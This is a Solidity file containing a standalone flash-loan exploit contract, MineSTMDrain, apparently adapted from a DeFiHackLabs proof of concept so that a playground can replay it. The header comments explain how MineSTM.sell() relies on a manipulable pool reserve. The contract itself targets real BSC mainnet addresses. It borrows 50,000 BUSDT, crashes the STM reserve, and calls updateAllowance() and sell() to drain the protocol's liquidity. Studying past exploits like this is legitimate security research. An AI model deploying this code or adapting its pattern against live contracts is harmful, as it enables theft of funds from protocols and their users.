// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-06-MineSTM).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (ContractTest is Test; the PancakeSwap-V3 flash callback `pancakeV3FlashCallback`
// lives on the test itself, so there is no standalone exploit contract to deploy).
// This contract is a faithful, self-contained copy of that inline attack
// (testExploit + pancakeV3FlashCallback) so the playground can deploy it and
// record run(). Logic and constants are copied verbatim from
// test/MineSTM_exp.sol.
//
// Root cause: MineSTM.sell(amount) redeems the PROTOCOL's own LP position,
// sized as `amount * inner_pair.totalSupply() / (2 * r1)` where `r1` is the
// pool's LIVE, manipulable STM reserve. The attacker flash-borrows BUSDT,
// swaps it into the thin BUSDT/STM pool to crash `r1` toward zero, then calls
// the permissionless `updateAllowance()` (arms the router's allowance over
// MineSTM's LP) followed by `sell()` with a few wei of STM — the crashed
// divisor makes `sell()` redeem a huge slice of MineSTM's LP, paying the
// BUSDT-heavy proceeds straight to the caller.

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface IUniPairV3 {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface IUniPairV2 {
    function sync() external;
}

interface IUniRouterV2 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IMineSTM {
    function updateAllowance() external;
    function sell(uint256 amount) external;
}

contract MineSTMDrain {
    // BUSDT/USDC PancakeSwap-V3 pool — flash-loan source.
    IUniPairV3 constant BUSDT_USDC = IUniPairV3(0x92b7807bF19b7DDdf89b706143896d05228f3121);
    // BUSDT (a.k.a. "USDT" on BSC).
    IERC20 constant BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    // STMERC20 ("EVE").
    IERC20 constant STM = IERC20(0xBd0DF7D2383B1aC64afeAfdd298E640EfD9864e0);
    // BUSDT/STM PancakeSwap-V2-style pair — the thin, manipulable pool.
    IUniPairV2 constant BUSDT_STM = IUniPairV2(0x2E45AEf311706e12D48552d0DaA8D9b8fb764B1C);
    // PancakeRouter clone.
    IUniRouterV2 constant ROUTER = IUniRouterV2(0x0ff0eBC65deEe10ba34fd81AfB6b95527be46702);
    // MineSTM — the vulnerable protocol contract.
    IMineSTM constant mineSTM = IMineSTM(0xb7D0A1aDaFA3e9e8D8e244C20B6277Bee17a09b6);

    uint256 constant flashBUSDTAmount = 50_000 ether;

    function run() external {
        // Borrow 50,000 BUSDT from the BUSDT/USDC V3 pool. amount1=0 (token1),
        // arbitrary calldata (uint256(1)) matches the historical PoC's callback data.
        BUSDT_USDC.flash(address(this), flashBUSDTAmount, 0, abi.encodePacked(uint256(1)));
    }

    function pancakeV3FlashCallback(uint256 /*fee0*/, uint256 /*fee1*/, bytes calldata /*data*/) external {
        // Snap the pool's reserves to its real (thin) balances before swapping.
        BUSDT_STM.sync();
        BUSDT.approve(address(ROUTER), flashBUSDTAmount);

        address[] memory path = new address[](2);
        path[0] = address(BUSDT);
        path[1] = address(STM);

        // Crash the STM reserve r1 by swapping the flash-borrowed BUSDT into
        // the thin pool (r1: 193 wei -> 44 wei).
        ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            flashBUSDTAmount, 0, path, address(this), block.timestamp
        );

        // Arm the router's allowance over MineSTM's LP (permissionless).
        STM.approve(address(mineSTM), type(uint256).max);
        mineSTM.updateAllowance();

        // With r1 crushed, sell() redeems a huge slice of MineSTM's own LP for
        // a few wei of STM. Two calls, tuned to the post-swap reserves, drain
        // MineSTM's liquidity down to dust.
        mineSTM.sell(81);
        mineSTM.sell(7);

        // Repay the flash loan: principal + 0.01% V3 fee.
        BUSDT.transfer(msg.sender, flashBUSDTAmount * 10_001 / 10_000);
    }
}
